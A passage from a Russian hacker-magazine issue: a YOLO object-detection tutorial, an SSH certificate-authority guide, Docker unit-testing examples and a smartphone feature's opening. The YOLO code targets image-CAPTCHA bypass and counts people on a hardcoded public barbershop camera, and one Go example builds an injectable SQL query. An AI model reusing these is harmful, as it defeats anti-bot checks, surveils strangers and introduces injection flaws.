  Обработка в режиме реального времени: поддержи вается при высоких
вычислительных мощ ностях.


YOLO, You Only Look Once
Изображение делится на квадратную сетку. Для каждой ячейки сети CNN
выводит вероятности определяемого клас са. Ячей ки, имеющие вероятность
класса выше порогового зна чения, выбира ются и используются для опре‐
деления местополо жения объекта на изображении.
  Обработка в режиме реального времени: поддерживается!
   Как видишь, YOLO пока что лучший вари ант для обнаружения и рас позна‐
вания образов. Он отличается высокой ско ростью и точностью обнаружения
объектов, а еще этот алго ритм можно использовать в проектах на Android
и Raspberry Pi с помощью нетребовательного tiny‐варианта сети, с которым
мы с тобой сегодня будем работать.
   Tiny‐вариант несколько проигрывает в точности пол ноценному варианту
сети, но и требует меньшей вычислительной мощ ности, что поз волит запус‐
тить проект, который мы сегодня будем делать, как на слабом компьюте ре,
так и, при желании, на смартфо не.


ПИШЕМ КОД
Чтобы написать легковесное приложение для обнаружения объектов на изоб‐
ражении, нам с тобой понадобятся:
 • названия классов датасета COCO, которые умеет определять сеть YOLO;
 • конфигурации для tiny‐варианта сети YOLO;
 • веса для tiny‐варианта сети YOLO.

Дополнительно установим библиотеки OpenCV и NumPy:


pip install opencv‐python
pip install numpy

Теперь напишем приложение, которое будет находить объекты на изоб‐
ражении при помощи YOLO и отмечать их.
  Мы попробуем обойти CAPTCHA с изоб ражениями грузовиков — класс
truck в датасете COCO. Дополнительно мы посчитаем количес тво обнаружен‐
ных объектов нужного нам клас са и выведем всю информацию на экран.
   Начнем с написания функции для применения YOLO. С ее помощью опре‐
деляются самые вероятные клас сы объектов на изображении, а также коор‐
динаты их границ, которые позже мы будем исполь зовать для отрисовки.


import cv2
import numpy as np



def apply_yolo_object_detection(image_to_process):
    """
    Распознавание и определение координат объектов на изображении
    :param image_to_process: исходное изображение
    :return: изображение с размеченными объектами и подписями к ним
    """
    height, width, depth = image_to_process.shape
    blob = cv2.dnn.blobFromImage(image_to_process, 1 / 255, (608, 608
), (0, 0, 0), swapRB=True, crop=False)
    net.setInput(blob)
    outs = net.forward(out_layers)
    class_indexes, class_scores, boxes = ([] for i in range(3))
    objects_count = 0


    # Запуск поиска объектов на изображении
    for out in outs:
        for obj in out:
            scores = obj[5:]
            class_index = np.argmax(scores)
            class_score = scores[class_index]
            if class_score > 0:
                center_x = int(obj[0] * width)
                center_y = int(obj[1] * height)
                obj_width = int(obj[2] * width)
                obj_height = int(obj[3] * height)
                box = [center_x ‐ obj_width // 2, center_y ‐
obj_height // 2, obj_width, obj_height]
                boxes.append(box)
                class_indexes.append(class_index)
                class_scores.append(float(class_score))


    # Выборка
    chosen_boxes = cv2.dnn.NMSBoxes(boxes, class_scores, 0.0, 0.4)
    for box_index in chosen_boxes:
        box_index = box_index[0]
        box = boxes[box_index]
        class_index = class_indexes[box_index]


        # Для отладки рисуем объекты, входящие в искомые классы
        if classes[class_index] in classes_to_look_for:
            objects_count += 1
            image_to_process = draw_object_bounding_box(
image_to_process, class_index, box)


    final_image = draw_object_count(image_to_process, objects_count)
    return final_image

Далее добавим функцию, которая поз волит нам обвести найденные на изоб‐
ражении объекты с помощью координат границ, которые мы получили в ap‐
ply_yolo_object_detection.


def draw_object_bounding_box(image_to_process, index, box):
    """
    Рисование границ объекта с подписями
    :param image_to_process: исходное изображение
    :param index: индекс определенного с помощью YOLO класса объекта
    :param box: координаты области вокруг объекта
    :return: изображение с отмеченными объектами
    """
    x, y, w, h = box
    start = (x, y)
    end = (x + w, y + h)
    color = (0, 255, 0)
    width = 2
    final_image = cv2.rectangle(image_to_process, start, end, color,
width)


    start = (x, y ‐ 10)
    font_size = 1
    font = cv2.FONT_HERSHEY_SIMPLEX
    width = 2
    text = classes[index]
    final_image = cv2.putText(final_image, text, start, font,
font_size, color, width, cv2.LINE_AA)


    return final_image

Добавим функцию, которая выведет количество распознанных объ ектов
на изображении.


def draw_object_count(image_to_process, objects_count):
    """
    Подпись количества найденных объектов на изображении
    :param image_to_process: исходное изображение
    :param objects_count: количество объектов искомого класса
    :return: изображение с подписанным количеством найденных объектов
    """


    start = (45, 150)
    font_size = 1.5
    font = cv2.FONT_HERSHEY_SIMPLEX
    width = 3
    text = "Objects found: " + str(objects_count)


    # Вывод текста с обводкой (чтобы было видно при разном освещении
картинки)
    white_color = (255, 255, 255)
    black_outline_color = (0, 0, 0)
    final_image = cv2.putText(image_to_process, text, start, font,
font_size, black_outline_color, width * 3, cv2.LINE_AA)
    final_image = cv2.putText(final_image, text, start, font,
font_size, white_color, width, cv2.LINE_AA)


    return final_image

Напишем функцию, которая будет анализировать изображение и выводить
на экран результат работы написанных нами алгоритмов.


def start_image_object_detection():
    """
    Анализ изображения
    """
    try:
        # Применение методов распознавания объектов на изображении
от YOLO
        image = cv2.imread("assets/truck_captcha.png")
        image = apply_yolo_object_detection(image)


        # Вывод обработанного изображения на экран
        cv2.imshow("Image", image)
        if cv2.waitKey(0):
            cv2.destroyAllWindows()


    except KeyboardInterrupt:
        pass

А теперь мы создадим функцию main, в которой нас троим нашу сеть и поп‐
робуем запустить ее.


if __name__ == '__main__':


    # Загрузка весов YOLO из файлов и настройка сети
    net = cv2.dnn.readNetFromDarknet("yolov4‐tiny.cfg", "yolov4‐tiny.
weights")
    layer_names = net.getLayerNames()
    out_layers_indexes = net.getUnconnectedOutLayers()
    out_layers = [layer_names[index[0] ‐ 1] for index in
out_layers_indexes]


    # Загрузка из файла классов объектов, которые умеет обнаруживать
YOLO
    with open("coco.names.txt") as file:
        classes = file.read().split("\n")


    # Определение классов, которые будут приоритетными для поиска на
изображении
    # Названия находятся в файле coco.names.txt
    # В данном случае определяется грузовик для прохождения CAPTCHA
    classes_to_look_for = ["truck"]


    start_image_object_detection()

Давай посмотрим, как алгоритм YOLO справился с тестом простой CAPTCHA.





                      Исходная CAPTCHA





                   Результат применения YOLO

Некоторая погрешность все же есть, но два из трех гру зовиков алгоритм выб‐
рал правильно.
   Кажется, пока что восстание машин нам не грозит! :)


МОДИФИЦИРУЕМ ПРИЛОЖЕНИЕ
Теперь мы с тобой приступим к решению практической задачи, в которой нам
будет важно контролировать количество человек в помещении. Тем более что
во время ограничительных мер, свя занных с COVID‐19, это не просто инте‐
ресно, но еще и актуально.
   Чтобы задача была на «живом примере», мы воспользуемся публичной
камерой, установленной в одном из барбершопов Лондона. Из‐за его скром‐
ной площади находиться внутри может не больше десяти человек.
   Чтобы решить эту задачу, дос таточно добавить функцию, которая будет
обрабатывать видео по кадрам и выводить результат обработки на экран.
Чтобы не нагружать устройство обра боткой каждого кад ра, обновление экра‐
на будет происходить по нажатию любой клавиши. На мощных компьютерах
это необязательно.


def start_video_object_detection():
    """
    Захват и анализ видео в режиме реального времени
    """
    while True:
        try:
            # Захват картинки с видео
            video_camera_capture = cv2.VideoCapture("http://81.130.
136.82:82/mjpg/video.mjpg")


            while video_camera_capture.isOpened():
                ret, frame = video_camera_capture.read()
                if not ret:
                    break


                # Применение методов распознавания объектов на кадре
видео от YOLO
                frame = apply_yolo_object_detection(frame)


                # Вывод обработанного изображения на экран с
уменьшением размера окна
                frame = cv2.resize(frame, (1920 // 2, 1080 // 2))
                cv2.imshow("Video Capture", frame)
                if cv2.waitKey(0):
                    break


            video_camera_capture.release()
            cv2.destroyAllWindows()


        except KeyboardInterrupt:
            pass

Также нам пот ребуется немного модифицировать функцию main, чтобы
теперь запускать обработку видео вмес то обра ботки изображения.


if __name__ == '__main__':


    # Загрузка весов YOLO из файлов и настройка сети
    net = cv2.dnn.readNetFromDarknet("yolov4‐tiny.cfg", "yolov4‐tiny.
weights")
    layer_names = net.getLayerNames()
    out_layers_indexes = net.getUnconnectedOutLayers()
    out_layers = [layer_names[index[0] ‐ 1] for index in
out_layers_indexes]


    # Загрузка из файла классов объектов, которые умеет обнаруживать
YOLO
    with open("coco.names.txt") as file:
        classes = file.read().split("\n")


    # Определение классов, которые будут приоритетными для поиска на
изображении
    # Названия находятся в файле coco.names.txt
    # В данном случае определяется грузовик для прохождения CAPTCHA
и человек для анализа видео
    classes_to_look_for = ["truck", "person"]


    start_video_object_detection()

Получаем результат: шесть из семи человек были рас познаны.





                    Результат обра ботки видео

Можно добавить и другие полезные функции: например, отправлять на почту
или в Telegram сооб щение о том, что в барбершоп набилось многовато
людей.


ИТОГИ
Алгоритмы обнаружения объектов не дают стопроцентной точности, но они
все равно эффективны и способ ны работать гораз до быстрее любого из нас.
  Возможно, ты спросишь, почему мы не следим, чтобы соб людалось рас‐
стояние в полтора метра. В реальной жиз ни его будет сложно проверять:
например, когда перед нами пара друзей, семья с ребенком или происходит
действие, невозможное без близкого контакта, а в парикмахерской это слу‐
чается постоянно. Кроме того, если камера будет стоять под неудачным
углом, сложность измерения рас стояния возраста ет.
   Здесь потребуются алго ритмы, определяющие в перспективе габариты
объектов и работающие с трехмерным прос транством. Такие используются
для определения транспортных средств в самоуправляемых автомобилях —
Aggregate View Object Detection или YOLO 3D Oriented Object Bounding Box
Detection.
  Исходники проекта, с которыми ты сможешь поработать над решением
подобных задач, смотри в моем репозитории на GitHub.
АДМИНSSH
    ПО-КРУПНОМУ

 ИСПОЛЬЗУЕМ УДОСТОВЕРЯЮЩИЙ ЦЕНТР
 SSH, ЧТОБЫ ОБЛЕГЧИТЬ ЖИЗНЬ АДМИНУ





Вроде бы SSH — хорошо известная вещь,
с  которой  ты наверняка  сталкива ешься
ежедневно. При этом мало кто зна ет о воз‐
можностях SSH больше, чем нужно, что бы
подключиться к удаленному серверу. А ведь        Андрей Пархоменко                                                                                    andrey@parkhomenko.pw
в этот инс трумент вхо дят фун кции, которые
могут очень пригодиться при более слож‐
ной структуре администрирования, с чем
многие  сейчас  столкнулись  в  связи
с  коронавирусом  и  уда ленкой. В  этой
статье я расскажу, что такое и как применя‐
ются SSH‐сертификаты с удостоверяющим
центром и принципалы.


Пожалуй, ни один человек не может назвать себя сисад мином, если он
не знает, что такое SSH, и не овладел хотя бы азами этого инс трумента.
SSH — это и ворота уда ленного сервера, и ключ, откры вающий эти ворота.
Большинство сисадминов давно сделали шаг от использования пароля
для аутентификации при соединении с сервером к паре криптографических
клю чей — публичному и закрытому. Этот небольшой шаг на самом деле был
огромным прогрессом в обеспечении безопас ности облачных служб.
  Но жизнь на месте не сто ит, и команда OpenSSH уже несколько лет назад
представила новые мощные инструменты SSH, которые дают большую гиб‐
кость и удобство удаленного администрирования, особенно если у сисад‐
мина в управле нии много уда ленных серверов. Один из таких инс трумен‐
тов — сертификаты SSH. Хотя они про ще обычных сертификатов x509,
почему‐то их проник новение в удаленное админис трирование идет туго.
Видимо, сказывается инерция мыш ления. А ведь что может быть красивее
и удобнее: ты выпускаешь корневой сертификат CA, который и загружаешь
на сервер. Всё, имея SSH‐сертификат, удостоверенный этим СА, ты можешь
заходить на удаленный сервер. А далее рассмотрим нюансы, которые могут
сделать жизнь сисадмина — не в ущерб безопас ности — легче и при ятнее.
   Итак, создадим наш CA. Для примера пусть это будет ключевая пара,
в которой используется схема цифровой подписи типа Ed25519. С легкой
руки американского криптографа Брюса Шнайера среди многих криптогра‐
фов утвердилось стой кое подоз рение, что Агентство национальной безопас‐
ности США (NSA) сделало закладку в стандартизованную Национальным
институтом стандартов и технологий США (NIST) эллиптичес кую кривую P‐
256. Мы не можем знать наверняка, так ли это. Но этот предполагаемый back‐
door потенциально ставит безопас ность коммуника ций под угрозу. И тут
очень кстати пришлась разработанная профес сором Дэниелом Дж. Берн‐
штейном эллиптическая кривая Curve25519. Она считается безопасной.
По крайней мере, никто из серь езных криптографов насчет этой кривой сом‐
нений не выражал. Вот и будем с ней работать дальше.
   Генерируем пару ключей для CA по известной стандартной процедуре (не
ленимся, устанавливаем пароль — здесь и далее):


$ ssh‐keygen ‐C CA ‐t ed25519 ‐f ca_key

Получаем два файла: ca_key и ca_key.pub. Они и образуют наш CA. Зак‐
рытый ключ ca_key прячем в надеж ном месте, а открытый ключ ca_key.pub
помещаем на удален ном сервере в /etc/ssh/ca_key.pub и даем серверу
команду доверять всем ключам, подписанным этим CA, добавив в конфигура‐
ционный файл сер вера /etc/ssh/sshd_config такую строку:


TrustedUserCAKeys /etc /ssh /ca_key .pub

А поскольку ранее мы положились на кривую Curve25519, то добавляем
в файл еще и такие строки:


PubkeyAcceptedKeyTypes ssh ‐ed25519‐cert ‐v01 @openssh.com
CASignatureAlgorithms ssh ‐ed25519

Не забываем перезагрузить SSH‐сервер после каждого изме нения кон‐
фигурации (здесь и далее):


$ sudo systemctl restart ssh.service

Далее по давно отработанному шаб лону генерируем пару пользовательских
клю чей для аутентификации на сервере:


$ ssh‐keygen ‐t ed25519 ‐f id_ed25519

и подписываем открытый ключ пользователя id_ed25519.pub:


$ ssh‐keygen ‐s ca_key ‐I alex25 ‐n root id_ed25519.pub

В результате получаем собственно сертификат пользователя: id_ed25519‐
cert.pub.
  Опция ‐I — это идентификатор клю ча, он может быть любой цифро‐бук‐
венной строкой, но лучше ее индивидуализировать, чтобы понимать, кто, ког‐
да и куда с таким идентификатором входил на сервер, так как в логах ID ключа
всегда указывается.
  Опция ‐n задает принципала (о них ниже), в данном случае это root. Пред‐
ставленная схема сертификата самая прос тая, а потому не самая безопас‐
ная. Она позволяет владельцу такого ключа входить когда угодно и откуда
угодно  на любой  сервер,  доверя ющий  данному  CA,  с  правами  root
без каких‐либо ограничений, а это пло хо.
  Изменить такое положение вещей можно, используя концепцию прин‐
ципалов. Принципал в самом общем случае — это сетевой ресурс, который
представ ляет вычислительный актор (компьютер, служба, процесс и подоб‐
ное) или даже конкрет ного человека, инициирующего дос туп к сетевым
ресурсам и подтвержда ющего свою подлинность этим сетевым ресурсам.
Далее будем рассматривать прин ципала в узком смысле как конкретного
человека, имеющего SSH‐сертификат.
  Допустим, у нас есть сервер с тремя непривилегированными пользовате‐
лями bob, dug и ted. Каж дый пользователь имеет свои, строго ограниченные
права доступа к файлам и катало гам. И, допустим, мы имеем трех прин‐
ципалов bill, betty и nell. Любому из этих принципалов может быть предос‐
тавлено право авторизоваться на сервере с правами любого пользовате ля.
Для этого создаем на сервере каталог auth_principals:


# mkdir /etc/ssh/auth_principals

А в конфигурационный файл вставляем строку


AuthorizedPrincipalsFile /etc /ssh /auth_principals /%u





                Получившийся кон фиг демона SSH

В каталоге auth_principals для любого поль зователя можно создать файл,
где  указать  тех  принципалов,  которые  упол номочены  авторизоваться
под именем данного пользователя. Например, разрешим принципалам betty
и nell авторизоваться в системе от имени пользователя dug:


# echo ‐e 'betty\nnell' > /etc/ssh/auth_principals/dug

А принципалу bill от имени пользователей bob и ted:


# echo bill > /etc/ssh/auth_principals/bob
# echo bill > /etc/ssh/auth_principals/ted

Смысл понятен, не так ли?
  Наконец, создаем принципалу bill сертификат:


$ ssh‐keygen ‐s ca_key ‐I alex25 ‐n bill ‐z 102348 ‐O no‐x11‐
forwarding ‐O source‐address=192.168.145.23,192.168.201.0/24 ‐V al‐
ways:20210602 id_ed25519.pub

С помощью опции ‐O source‐address мы раз решили bill входить в систему
только с определенного IP‐адреса и/или определенной сети. С помощью
опции ‐z даем сертификату серийный номер для учета и контроля и воз‐
можного отзыва. Опция ‐O no‐x11‐forwarding запрещает x11‐forwarding.
  Посмотрим, что получилось:



  $ ssh‐keygen ‐Lf id_ed25519‐cert.pub
  id_ed25519‐cert.pub:
          Type: ssh‐ed25519‐cert‐v01@openssh.com user certificate
          Public key: ED25519‐CERT SHA256:dD70q0bRoSXGkXcW7FICHIIwyPcFs‐
  na86zKZbVkkYnk
          Signing CA: ED25519 SHA256:Dmzn5HfQ8HXnYV+itFuRzb2lClISGLB7gX4B‐
  MzVGPVQ
          Key ID: "alex25"
          Serial: 102348
          Valid: before 2021‐06‐02T01:00:00
          Principals:
                  bill
          Critical Options:
                  source‐address 192.168.145.23,192.168.201.0/24
          Extensions:
                  permit‐agent‐forwarding
                  permit‐port‐forwarding
                  permit‐pty
                  permit‐user‐rc


Что ж, неплохо. Теперь не забудем помес тить все эти ключи и сертификаты
на клиентской машине в правиль ный каталог .ssh и отредактировать там же
файл conﬁg. Но это все сисадмины давно научились делать еще на прежнем
шаге освоения SSH.





  Принципал может иметь доступ к аккаунтам раз ных пользователей
  на разных серверах


ВЫВОДЫ
Таким образом, используя некоторые не самые рас пространенные инстру‐
менты SSH, можно и в вопросах безопас ности быть на высоте, и экономить
время и усилия за счет лучшего структурирования доступа к удаленным
ресурсам разных сотрудников с раз ными правами. Но SSH таит в себе
еще много полезных фирменных примочек. Изучай документацию и читай
журнал «Хакер»!
АДМИН





КОНТЕЙНЕРНО-МОДУЛЬНОЕ
ТЕСТИРОВАНИЕ
       ПИШЕМ ЮНИТ‐ТЕСТЫ
        ДЛЯ ОБРАЗОВ DOCKER




Тестирование — важный шаг на всех этапах
разработки ПО. Но не все компоненты име‐
ют очевидные, известные и понятные пути
тестирования. К примеру, обра зы Docker
либо не тестируют вообще, либо тестируют         Александр Шуляк                                                                                              alex.shulyak.v@gmail.com
только на пригодность к запуску. В этой
статье  я  рас ска жу,  как  про тестировать
образ Docker так, чтобы убедиться в том,
что он на 100% выполняет свои задачи.


ВВЕДЕНИЕ В ТЕСТИРОВАНИЕ
Юнит‐тестирование (или модульное тес тирова ние) — это процесс в раз‐
работке программного обеспечения, позволя ющий проверить работос‐
пособность отдельных модулей исходного кода. Такое тес тирование при выч‐
но применяется в разработке непос редственно программного обеспечения,
однако с ходу сложно себе предста вить юнит‐тес тирование образа Docker.
   Взглянем на простейший Dockerﬁle:


FROM busybox:1.32.1
RUN echo 'Hello, World!' > /test.txt

Здесь мы выполняем единс твенное действие — добавляем файл со строкой
Hello, World! в файл /test.txt.
   Как можно проверить, что мы дос тигаем желаемого результата? Можно
запустить собранный контейнер и посмотреть, что, во‐первых, нужный файл
присутствует, а во‐вторых, его содержимое равно ожидаемому.


$ docker build ‐t test .
[+] Building 7.7s ( 6/6) FINISHED
$ docker run ‐‐rm test ls ‐lha /test.txt
‐rw‐r‐‐r‐‐    1 root     root          14 Feb 20 19:26 /test.txt
$ docker run ‐‐rm test cat /test.txt
Hello, World!

Не слишком удоб но, не так ли? К счастью, существу ет фреймворк terratest. Он
позволяет писать тесты на Golang для Docker (и docker‐compose) так же, как и
для обычного кода!
   Взглянем на программную реализацию данного теста:


package docker_test


import (
    "testing"


    "github.com/gruntwork‐io/terratest/modules/docker"
    "github.com/stretchr/testify/assert"
)


func TestDockerImage(t *testing.T) {
    // Определяем название образа для тестирования
    tag := "test"
    buildOptions := &docker.BuildOptions{
        Tags: []string{tag},
    }
    // Собираем образ из Dockerfile’а
    docker.Build(t, "../", buildOptions)
    // Фактически выставляем как опции запуск контейнера со
следующими командами
    // Команда, которая вернет 'exists', если файл существует
    eOpts := &docker.RunOptions{Command: []string{"sh", "‐c", "[ ‐f /
test.txt ] && echo exists"}}
    // Команда, которая вернет содержимое файла
    cOpts := &docker.RunOptions{Command: []string{"cat", "/test.txt"}
}
    // Запускаем контейнер с проверкой на наличие файла
    chkExisting := docker.Run(t, tag, eOpts)
    // Проверяем, что вывод равен желаемому
    assert.Equal(t, "exists", chkExisting)
    // Запускаем контейнер с выводом содержимого файла
    chkContent := docker.Run(t, tag, cOpts)
    // Проверяем, что вывод равен желаемому
    assert.Equal(t, "Hello, World!", chkContent)
}

Стало ощутимо удоб нее! Благодаря полноценному языку программирования
мы можем создавать намного более слож ные сценарии тестирования,
использовать API докер и так далее.


УСЛОЖНЯЕМ: ТЕСТИРОВАНИЕ HTTP-СЕРВЕРА
С ЗАВИСИМОСТЯМИ
К сожалению, примеры вро де Hello World редко объясня ют реальные кейсы
применения технологии, поэтому давай предста вим несколько более слож‐
ный случай. К примеру, есть Golang‐приложение (прос той HTTP‐сервер):


package main


import (
    "fmt"
    "net/http"
)


func hello(w http.ResponseWriter, req *http.Request) {
    fmt.Fprintf(w, "hello")
}


func main() {
    http.HandleFunc("/hello", hello)
    http.ListenAndServe(":8000", nil)
}

Предположим, приложению также требуется бинарник curl для работы. Тог‐
да Dockerﬁle будет выглядеть следующим образом:


# Первым делом собираем само приложение
FROM golang:1.16 as builder
WORKDIR /src/app
COPY ./main.go /src/app
RUN CGO_ENABLED=0 go build ‐o /go/bin/app main.go


# Далее собираем базовый образ из alpine, добавляя туда бинарник curl
FROM alpine:3.13.2 AS basis
RUN apk add ‐‐no‐cache curl


# Следующим номером открываем порт 8080 и добавляем бинарник из шага
сборки
FROM basis AS production
EXPOSE 8080
COPY ‐‐from= builder /go/bin/app /usr/bin/app
ENTRYPOINT [ "/usr/bin/app" ]

Что здесь можно проверить:
 • наличие бинарника curl;
 • что сервер успешно поднимается и порт 8080 открыт и прослушивается.

Взглянем, какие можно написать тес ты (код пол ностью доступен в конце
статьи).
  Вынесем сбор ку обра зов в отдельную функцию, чтобы не повторяться:


func BuildWithTarget(t *testing.T, dCtx string, tag string, target
string) {
    buildOptions := &docker.BuildOptions{
        Tags:         []string{tag},
        // Target для сборки multi‐stage
        Target: target,
    }
    docker.Build(t, dCtx, buildOptions)
}

Первым тестом проверим, как и в предыдущем примере, наличие бинарника
curl:


func TestBasisLayer(t *testing.T) {
    tag := fmt.Sprintf("go_demo:%s", BasisTarget)
    // Собирается образ с нужным таргетом
    BuildWithTarget(t, "../", tag, BasisTarget)
    // И далее схожим образом проверяем наличие файла curl
    opts := &docker.RunOptions{
        Command: []string{"sh", "‐c", "[ ‐f /usr/bin/curl ] && echo
exists"},
        Remove:  true,
    }
    chkExisting := docker.Run(t, tag, opts)
    assert.Equal(t, "exists", chkExisting)
}

Вторым — доступен ли HTTP‐сервер. Здесь уже слож нее:


func TestProductionLayerServerAvailability(t *testing.T) {
    tag := fmt.Sprintf("go_demo:%s", ProdTarget)
    BuildWithTarget(t, "../", tag, ProdTarget)


    // Обязательно выставляем параметр Detach, в противном случае
    // процесс зависнет на выводе запущенного контейнера.
    // Параметр ‐P позволит пробросить порт на случайный свободный
    // порт на хосте, тем самым позволяя избежать ошибки с выбором
занятого порта
    opts := &docker.RunOptions{
        Remove:       true,
        Detach:       true,
        OtherOptions: []string{"‐P"},
    }
    // Далее запускаем контейнер и получаем его ID
    cntId := docker.RunAndGetID(t, tag, opts)
    // Через интерфейс функции Inspect получаем проброшенный порт
    cntInsp := docker.Inspect(t, cntId)
    hostPort := cntInsp.GetExposedHostPort(uint16(8000))
    url := fmt.Sprintf("http://localhost:%d/hello", int(hostPort))
    // Используя http_helper из библиотеки terratest, можно сделать
    // запрос к выбранному URL и проверить результаты запроса
    status, _ := http_helper.HttpGet(t, url, &tls.Config{})
    assert.Equal(t, 200, status)
    // В последнюю очередь удаляем использованный контейнер
    docker.Stop(t, []string{cntId}, &docker.StopOptions{})
}


БАЗЫ ДАННЫХ И COMPOSE
Рассмотрим несколь ко более сложный пример, когда приложе ние требует
подклю читься к некото рой базе данных Postgres. У официального образа есть
возможность подложить скрипт, который будет выполнять конфигурацию схе‐
мы и добавлять какие‐то тестовые данные. Исполь зуем это на этапе тес‐
тирования.
  Примера скрипта инициализации БД:


#!/bin/bash
set ‐e


# Создаем тестовую базу
psql ‐v ON_ERROR_STOP= 1 ‐‐username "$POSTGRES_USER" ‐‐dbname "
$POSTGRES_DB" <<‐EOSQL
    CREATE DATABASE demo;
    GRANT ALL PRIVILEGES ON DATABASE demo TO postgres;
EOSQL


# Добавляем таблицу и «тестовые данные»
psql ‐v ON_ERROR_STOP= 1 ‐‐username "$POSTGRES_USER" ‐‐dbname "demo" <
<‐EOSQL
    CREATE TABLE demo (
      id SERIAL PRIMARY KEY,
      messages VARCHAR(100) NOT NULL
    );
    INSERT INTO demo(messages) VALUES ('hello_xakep.ru!');
EOSQL

В код программы добавим простую функцию, которая будет забирать из БД
строку по ее ID в таблице:


func getPsqlData(id string) string {
    host := os.Getenv("DB_HOST")
    port := os.Getenv("DB_PORT")
    user := os.Getenv("DB_USER")
    password := os.Getenv("DB_PASS")
    dbname := os.Getenv("DB_NAME")
    psqlconn := fmt.Sprintf("host=%s port=%s user=%s password=%s
dbname=%s sslmode=disable", host, port, user, password, dbname)
    db, err := sql.Open("postgres", psqlconn)
    if err != nil {
        panic(err)
    }
    defer db.Close()
    rows, err := db.Query(fmt.Sprintf(`SELECT "messages" FROM "demo"
WHERE id=%s`, id))
    if err != nil {
        panic(err)
    }
    var message string
    defer rows.Close()
    for rows.Next() {
        err = rows.Scan(&message)
        if err != nil {
            panic(err)
        }
    }
    return message
}

Dockerﬁle для сборки приложения выглядит схоже с прошлым примером,
но добавилось скачивание пакетов:


FROM golang:1.16 as builder
WORKDIR /src/app
COPY ./ /src/app
RUN go get ‐d ‐v ‐u all
RUN CGO_ENABLED=0 go build ‐o /go/bin/srvapp server.go


FROM alpine:3.12.0
EXPOSE 8000
COPY ‐‐from= builder /go/bin/srvapp /usr/bin/srvapp
ENTRYPOINT ["/usr/bin/srvapp"]

Для тестирования напишем docker‐compose‐файл, который запускает БД,
и рядом собранное приложение:


version: '3.1'


services:
# База данных с пробросом скрипта для инициализации
  db:
    image: postgres
    environment:
      POSTGRES_PASSWORD: dont_use_this_in_prod
    volumes:
      ‐ ./scripts:/docker‐entrypoint‐initdb.d
# Серверная часть с указанием параметров подключения к БД и
пробросом портов
  server:
    image: demo:server
    environment:
      DB_USER: postgres
      DB_PASS: dont_use_this_in_prod
      DB_HOST: db
      DB_PORT: 5432
      DB_NAME: demo
    ports:
    ‐ 8000:8000
    depends_on:
      ‐ db

Сам случай тестирования стал сложнее, но тест — проще. Простая функция
для сборки самого образа:


func BuildDockerImage(t *testing.T, dCtx string, tag string) {
    buildOptions := &docker.BuildOptions{
        Tags:         []string{tag},
    }
    docker.Build(t, dCtx, buildOptions)
}

И сам тест:


func TestServerAvailability(t *testing.T) {
    // Сборка образа
    BuildDockerImage(t, "../", "demo:server")


    // Указание в опциях контекста для docker‐compose
    opts := &docker.Options{
        WorkingDir: "../",
    }
    // Обязательно указываем, что вне зависимости от исхода теста
контейнеры будут удалены
    defer docker.RunDockerCompose(t, opts,"down")
    // Запускаем docker‐compose
    docker.RunDockerCompose(t, opts, "up","‐d")
    // Не очень элегантное решение, но надо подождать, чтобы база
данных успела инициализировать схему
    time.Sleep(20*time.Second)
    url := "http://localhost:8000/message"
    // Проверка ответов от запроса
    status, response := http_helper.HttpGet(t, url, &tls.Config{})
    assert.Equal(t, 200, status)
    assert.Equal(t, "hello_xakep.ru!", response)
}

Если все прошло хорошо, то вывод очень лаконичный.





                                success

Если тест валится по каким‐то причинам, то будет довольно прос то понять,
что именно пошло не так.





                                           failed

С этим фреймвор ком можно протестировать все шаги сборки внутри самого
Dockerﬁle, а также общую функциональность приложения. И быть уверенным,
что далее в окружения отправляют ся полностью рабочие образы.
  Полный код теста HTTP‐сервера:


package docker_test


import (
    "crypto/tls"
    "fmt"
    "github.com/gruntwork‐io/terratest/modules/docker"
    http_helper "github.com/gruntwork‐io/terratest/modules/
http‐helper"
    "github.com/stretchr/testify/assert"
    "testing"
)


const (
    BasisTarget = "basis"
    ProdTarget  = "production"
)


func BuildWithTarget(t *testing.T, dCtx string, tag string, target
string) {
    buildOptions := &docker.BuildOptions{
        Tags:         []string{tag},
        Target: target,
    }
    docker.Build(t, dCtx, buildOptions)
}


func TestBasisLayer(t *testing.T) {
    tag := fmt.Sprintf("go_demo:%s", BasisTarget)
    BuildWithTarget(t, "../", tag, BasisTarget)


    opts := &docker.RunOptions{
        Command: []string{"sh", "‐c", "[ ‐f /usr/bin/curl ] && echo
exists"},
        Remove:  true,
    }
    chkExisting := docker.Run(t, tag, opts)
    assert.Equal(t, "exists", chkExisting)
}


func TestProductionLayerServerAvailability(t *testing.T) {
    tag := fmt.Sprintf("go_demo:%s", ProdTarget)
    BuildWithTarget(t, "../", tag, ProdTarget)


    opts := &docker.RunOptions{
        Remove:       true,
        Detach:       true,
        OtherOptions: []string{"‐P"},
    }
    cntId := docker.RunAndGetID(t, tag, opts)
    cntInsp := docker.Inspect(t, cntId)
    hostPort := cntInsp.GetExposedHostPort(uint16(8000))
    url := fmt.Sprintf("http://localhost:%d/hello", int(hostPort))
    status, _ := http_helper.HttpGet(t, url, &tls.Config{})
    assert.Equal(t, 200, status)
    docker.Stop(t, []string{cntId}, &docker.StopOptions{})
}

Полный код примера тестирова ния с помощью docker‐compose:


package docker_test


import (
    "crypto/tls"
    "github.com/gruntwork‐io/terratest/modules/docker"
    http_helper "github.com/gruntwork‐io/terratest/modules/
http‐helper"
    "github.com/stretchr/testify/assert"
    "testing"
    "time"
)


func BuildDockerImage(t *testing.T, dCtx string, tag string) {
    buildOptions := &docker.BuildOptions{
        Tags:         []string{tag},
    }
    docker.Build(t, dCtx, buildOptions)
}


func TestServerAvailability(t *testing.T) {
    BuildDockerImage(t, "../", "demo:server")


    opts := &docker.Options{
        WorkingDir: "../",
    }
    defer docker.RunDockerCompose(t, opts,"down")
    docker.RunDockerCompose(t, opts, "up","‐d")
    time.Sleep(20*time.Second)
    url := "http://localhost:8000/message"
    status, response := http_helper.HttpGet(t, url, &tls.Config{})
    assert.Equal(t, 200, status)
    assert.Equal(t, "hello_xakep.ru!", response)
}

Готово!
GEEK
 ПУТЬ
 ОТКАЗА

                  КАКИХ ФИЧ
           МЫ ЛИШИЛИСЬ
 В СОВРЕМЕННЫХ СМАРТФОНАХ





Еще недавно производители смартфо нов
радовали нас интересными мелочами. Мы
видели  гнутые,  небь ющиеся,  складные
и чувствительные к нажатию дисплеи, мик‐
роскопические сен соры  с  разрешением           Олег Афонин                                                                                      Эксперт по мобильной
в сотню мегапикселей, поворотные, телес‐       криминалистике«Элкомсофт»компании
копические и выезжающие камеры и даже        aoleg@voicecallcentral.com
модули рас ширения, которые можно было
примагнитить к устройству. Что из это го
пережило провер ку временем, появилось
ли что‐то новенькое и чем про изво дители
